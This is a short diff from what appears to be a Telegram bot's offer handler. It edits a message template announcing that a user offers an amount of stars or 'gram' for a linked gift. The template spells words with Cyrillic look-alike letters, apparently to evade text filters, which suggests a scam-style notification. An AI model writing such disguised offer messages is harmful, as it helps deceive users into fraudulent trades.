@@ -249,7 +249,7 @@ async def handle_offer(message: Message) -> None:
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
 
-    text = f"Usеr <b>{sender_name}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
+    text = f"Usеr <b>{sender_name}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr Is vаIid fоr <b>6 h. 0 min</b>.."
 
     offer_id = uuid.uuid4().hex[:12]
     offers[offer_id] = {
